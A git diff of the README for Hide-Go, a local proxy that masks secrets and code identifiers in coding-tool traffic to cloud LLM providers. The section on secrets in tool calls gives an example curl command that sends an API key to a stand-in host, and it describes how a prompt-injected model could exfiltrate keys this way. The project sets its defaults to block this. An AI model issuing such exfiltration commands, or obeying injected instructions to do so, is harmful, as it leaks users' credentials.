@@ -27,7 +27,7 @@
 
 If you run `tcpdump` or a local proxy while coding with Claude Code, Cursor, or Codex, the outbound traffic is eye-opening. You ask the model to fix a one-line type error, and the client quietly ships your `.env` values, Git remotes, internal database IPs, and directory trees to upstream endpoints like `/api/event_logging` or background `repo-indexing` workers.
 
-**Hide-Go** sits on `127.0.0.1:18787` between your local coding tools and cloud LLM providers. It compiles into a single ~9MB Rust binary (Windows, macOS, and Linux) with the desktop UI embedded directly inside the executable. Before a request leaves your machine, Hide-Go swaps real secrets and proprietary code identifiers for format-preserving decoys or cover-domain code. When the upstream SSE stream comes back, a sliding-window restorer swaps your real names back in on the fly.
+**Hide-Go** sits on `127.0.0.1:18787` between your local coding tools and cloud LLM providers. It compiles into a single ~8MB Rust binary (Windows, macOS, and Linux) with the desktop UI embedded directly inside the executable. Before a request leaves your machine, Hide-Go swaps real secrets and proprietary code identifiers for format-preserving decoys or cover-domain code. When the upstream SSE stream comes back, a sliding-window restorer swaps your real names back in on the fly.
 
 ```mermaid
 flowchart LR
@@ -46,7 +46,7 @@ You can switch modes anytime from the top bar of the desktop window without rest
 | Mode | When to use it | What leaves your editor | What the provider sees |
 | :--- | :--- | :--- | :--- |
 | **1. Audit Only** | See what your tools are uploading behind your back | Untouched payload | Untouched payload, while the local UI highlights leaked paths, keys, and telemetry calls |
-| **2. Auto Desensitize** | Daily coding when you want secrets and internal network topology stripped | Real DB URLs, API keys, private IPs, file paths | **Format-valid fake tokens** (`10.254.0.2`, `sk-sem-0001`), restored locally on stream return |
+| **2. Auto Desensitize** | Daily coding when you want secrets and internal network topology stripped | Real DB URLs, API keys, private IPs, file paths | **Format-valid fake tokens** (`198.18.0.1`, `sk-sem-placeholder-key-0001`), restored locally on stream return |
 | **3. All-Hide** | Core algorithms or sensitive repos where even business domain names shouldn't leak | Proprietary trading, risk, or internal business logic | **Botanical garden cover code**, **Braille high-entropy cipher**, or **Chaff decoy files** |
 
 ### Side-by-side: what stays local vs. what hits the cloud
@@ -77,14 +77,14 @@ pub fn verify_margin_liquidation(
 <td>
 
 ```rust
-// [BotanicalSensor-01] Calibrate greenhouse soil humidity
-// Path: /workspace/sandbox_proj/src/module_01.rs
-pub fn check_orchid_soil_moisture(
-    terrarium_sensor_id: &str,
+// GreenhouseApp_01 HFT settlement module
+// Path: /workspace/user_01/GreenhouseApp_01/src/pay.rs
+pub fn compost_magnolia_766(
+    nectar_foliage_130: &str,
 ) -> bool {
-    let db = "postgres://db_user_01:pass_01@10.254.0.2:5432/app_01";
+    let db = "postgres://db_user_01:db_pass_placeholder_01@db-01.example.internal:5432/app_schema_01";
     let key = "sk-sem-placeholder-key-0001";
-    compute_foliage_hydration_index(terrarium_sensor_id, db, key)
+    chlorophyll_bamboo_186(nectar_foliage_130, db, key)
 }
 ```
 
@@ -92,18 +92,21 @@ pub fn check_orchid_soil_moisture(
 </tr>
 </table>
 
+> The right-hand column is the gateway's real output, captured from a local run and not edited. Cover names are hashed from the project salt, which is generated randomly on each install, so the names on your machine will differ. `ProjectTitan` is replaced because the default configuration ships with a sample custom rule for it.
+
 > **Why can the model still write working code?**
-> Language keywords (`pub`, `fn`, `let`, `bool`), types, and call graphs stay intact. The model analyzes the control flow of `check_orchid_soil_moisture` and streams back its fix. As chunks arrive over SSE, `StreamRestorer` reassembles tokens split across packet boundaries and translates `check_orchid_soil_moisture` back to `verify_margin_liquidation` before your harness ever renders the diff.
+> Language keywords (`pub`, `fn`, `let`, `bool`), types, and call graphs stay intact. The model analyzes the control flow of `compost_magnolia_766` and streams back its fix. Hide-Go translates it back to `verify_margin_liquidation` before your harness ever renders the diff: SSE streams go through `SseRestorer`, which reassembles tokens split across chunk boundaries, and plain JSON responses go through `restore`. Both paths produce the same result.
 
 ---
 
-## Inside All-Hide: three independent switches
+## Inside All-Hide: four independent switches
 
-You can mix and match these three sub-modes inside the All-Hide configuration panel:
+You can mix and match these four sub-modes inside the All-Hide configuration panel:
 
-* 🌱 **Isomorphic Camouflage**: Hashes your function names, structs, variables, and inline comments with a project salt into one of three built-in cover vocabularies (`Botanical Garden`, `Library Catalog`, or `Bakery Recipe`).
-* ⠿ **Cipher Garble**: Encodes payload blocks into reversible high-entropy Braille/XOR streams (`⟦HIDE-CIPHER::⠷⠩⡬⡺⢵⣑⡬...⟧`) so plaintext audit logs and regex scrapers on the vendor side only see gibberish.
-* 🎭 **Telemetry & Indexing Chaff**: Blocking telemetry or `repo-indexing` outright causes some IDEs to throw modal errors or refuse to run. When Chaff mode catches a background upload, it feeds the vendor a synthetic decoy repo snapshot of similar size instead of dropping the connection.
+* 🔤 **Strict Literal Masking** (on by default): Replaces quoted string literals in code with placeholders of the form `<<HIDE_STR_001>>` and restores them on the way back. Natural-language prompts are left alone.
+* 🌱 **Isomorphic Camouflage** (on by default): Hashes compound identifiers (snake_case, camelCase, PascalCase) and trailing `//` comments with a project salt into one of three built-in cover vocabularies (`Botanical Garden`, `Library Catalog`, or `Bakery Recipe`). Plain English words and prose keep their meaning, and tool definitions, call IDs and request structure are never rewritten, so the request is always a valid API call.
+* ⠿ **Cipher Garble** (off by default): Encrypts payload blocks into high-entropy Braille streams (`⟦HIDE-CIPHER::⠷⠩⡬⡺⢵⣑⡬...⟧`) so plaintext audit logs and regex scrapers on the vendor side only see gibberish. The cost is that **the model cannot read the content either**, so this only suits data that has to be echoed back verbatim rather than understood.
+* 🎭 **Telemetry & Indexing Chaff** (on by default): Telemetry requests never leave your machine; the gateway answers them locally with a success response. Background code-indexing uploads keep their JSON shape and roughly their size, with every content string swapped for decoy code. Telemetry is recognised by **request path only**, so inference endpoints such as `/v1/messages` and `/chat/completions` are never intercepted.
 
 ---
 
@@ -130,20 +133,28 @@ Hide-Go ships with request fingerprinting and dedicated local routes for 7 tools
 export ANTHROPIC_BASE_URL="http://127.0.0.1:18787/claude-code"
 
 # OpenAI Codex
-export OPENAI_BASE_URL="http://127.0.0.1:18787/codex"
+export OPENAI_BASE_URL="http://127.0.0.1:18787/codex/v1"
 
 # Grok Build
-export XAI_BASE_URL="http://127.0.0.1:18787/grok-build"
+export XAI_BASE_URL="http://127.0.0.1:18787/grok-build/v1"
 ```
 
 **Windows (PowerShell)**
 ```powershell
 $env:ANTHROPIC_BASE_URL = "http://127.0.0.1:18787/claude-code"
-$env:OPENAI_BASE_URL    = "http://127.0.0.1:18787/codex"
-$env:XAI_BASE_URL       = "http://127.0.0.1:18787/grok-build"
+$env:OPENAI_BASE_URL    = "http://127.0.0.1:18787/codex/v1"
+$env:XAI_BASE_URL       = "http://127.0.0.1:18787/grok-build/v1"
 ```
 
 </details>
+
+> **Integration limits**: Hide-Go is a reverse-proxy gateway, not an HTTPS forward proxy. **It cannot be wired in through `HTTPS_PROXY`**: the gateway does not serve CONNECT, so that setting would only break every HTTPS request made from your shell. A tool has to support a custom API base URL. Two more known boundaries:
+> * **Cursor** relays custom base URL requests through Cursor's own servers, which cannot reach `127.0.0.1` on your machine. You would have to expose the gateway through an HTTPS tunnel yourself and accept the exposure that comes with it.
+> * **Qoder**'s built-in indexing channel bypasses the gateway if it does not read the base URL variable.
+
+## Secrets in tool calls are restored only for file writes by default
+
+Tool calls issued by the model (shell commands, network requests, file writes) run on your machine. If real secrets were always restored inside those arguments, a prompt-injected model would only have to echo a placeholder, as in `curl https://x/?k=sk-sem-placeholder-key-0001`, to make your machine run the command with the real key. The default policy is therefore: **restore only inside the content fields of file writes and edits, and keep placeholders in command lines and URLs**. Use environment variables for commands that need a real key. You can switch to "always keep placeholders" or "restore everywhere" in the console under 保护策略 (Policy) → 工具调用中的凭据 (Secrets in tool calls); the console UI is currently Chinese-only. Placeholders in ordinary text replies are always restored, and non-secret data such as paths and internal addresses is not affected by this setting.
 
 ---
 
@@ -162,6 +173,22 @@ Grab the standalone binary for your OS from the [Releases page](https://github.c
   ```
 
 Launching the binary starts the local proxy on `127.0.0.1:18787` and opens the desktop console window. Set `HIDE_GO_HEADLESS=1` if you want to run the gateway on a headless server without spawning a window.
+
+| Environment variable | Effect |
+| :--- | :--- |
+| `HIDE_GO_PORT` | Listening port. Defaults to the value in the config file (`18787`) |
+| `HIDE_GO_HEADLESS` | When set, no console window is opened |
+| `HIDE_GO_CONFIG` | Config file path. Defaults to `%APPDATA%\hide-go\config.json` (Windows), `~/Library/Application Support/hide-go/config.json` (macOS), `~/.config/hide-go/config.json` (Linux) |
+| `HIDE_GO_UPSTREAM_URL` | Sends every tool to a self-hosted or third-party compatible endpoint. A single request can override it with the `X-Hide-Go-Upstream` header |
+| `HIDE_GO_ADMIN_TOKEN` | Pins the management API token. Without it a random token is generated on each start |
+
+### Where your data lives
+
+* The gateway listens on `127.0.0.1` only. Other devices on your network cannot reach it.
+* The **mapping table** (placeholder ↔ real value) exists only in process memory and is gone when the process exits. It holds at most 50,000 entries and evicts the least recently used ones beyond that.
+* **Traffic records** are also memory-only, limited to the most recent 200.
+* The only thing written to disk is the config file: processing mode, custom rules and the project salt. The salt is generated randomly on first run.
+* The management API requires a token and checks `Host`, `Origin` and `Sec-Fetch-Site` to stop DNS rebinding and cross-site requests. The token is never stored in a cookie.
 
 ---
 
@@ -183,13 +210,18 @@ cargo build --release -p hide-go-desktop
 ```text
 hide-go/
 ├── crates/hide-core/          # Core Rust library & standalone daemon
-│   └── src/
-│       ├── scanner.rs         # Regex & heuristic scanner for keys, DB URLs, private IPs, and paths
-│       ├── vault.rs           # Thread-safe bidirectional token <-> raw secret dictionary
-│       ├── desensitizer.rs    # Format-preserving semantic token generator
-│       ├── all_hide.rs        # Isomorphic cover vocabularies, Braille cipher, and Chaff generator
-│       ├── stream_restorer.rs # Sliding-window SSE restorer across arbitrary chunk splits
-│       └── proxy.rs           # Axum reverse proxy & local harness simulator
-├── src/                       # Desktop UI (4-pane diff inspector, mode studio, vault viewer)
-└── src-tauri/                 # Single-binary asset embedder & native OS window launcher
+│   ├── src/
+│   │   ├── scanner.rs         # Scanner for keys, DB URLs, private IPs, paths, and custom rules
+│   │   ├── vault.rs           # Thread-safe bidirectional placeholder <-> raw value table, size-capped
+│   │   ├── desensitizer.rs    # Format-preserving placeholder generator
+│   │   ├── all_hide.rs        # Cover vocabularies, literal masking, Braille cipher, and chaff generator
+│   │   ├── protocol.rs        # Wire-protocol fields that must stay byte-exact (IDs, enums, signed blocks, tool schemas)
+│   │   ├── restore.rs         # JSON response restoration and the tool-call secret policy
+│   │   ├── sse_restorer.rs    # Protocol-aware, per-channel SSE stream restorer
+│   │   ├── stream_restorer.rs # Sliding-window text restorer across arbitrary chunk splits
+│   │   ├── harness.rs         # Detection, routes, and setup scripts for the 7 tools
+│   │   └── proxy.rs           # Axum reverse proxy, management API, and offline simulator
+│   └── tests/                 # Regression tests for the code-review findings
+├── src/                       # Desktop UI (overview, traffic inspector, policy, custom rules, mapping table, integrations)
+└── desktop/                   # Single-binary asset embedder & console window launcher
 ```
